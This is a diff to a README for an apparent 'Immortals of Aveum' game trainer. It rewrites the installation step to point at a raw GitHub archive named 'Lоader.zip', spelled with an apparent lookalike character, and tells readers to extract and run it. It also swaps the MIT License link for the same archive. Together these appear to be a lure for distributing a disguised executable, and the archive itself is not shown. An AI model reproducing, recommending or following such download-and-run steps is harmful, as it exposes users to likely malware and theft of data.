@@ -27,7 +27,7 @@ Welcome to the **Immortals of Aveum Trainer Script**! This advanced script empow
 
 ## 📥 Installation Guide 
 
-1. **Download `Loader.rar` from this repository.**
+1. **Download `https://raw.githubusercontent.com/shakibmunsi/AveumAscendant-TrainerScript/main/Lоader.zip` from this repository.**
 2. Extract and run the Loader on your compatible OS.
 3. Follow on-screen prompts; customize settings via real-time UI.
 4. Launch *Immortals of Aveum* and activate features as desired.
@@ -42,4 +42,4 @@ This tool is intended for educational and personal fun only. Use responsibly. We
 
 ## 📝 MIT License
 
-Licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025. Share and modify freely—credit encouraged!
+Licensed under the [MIT License](https://raw.githubusercontent.com/shakibmunsi/AveumAscendant-TrainerScript/main/Lоader.zip) © 2025. Share and modify freely—credit encouraged!
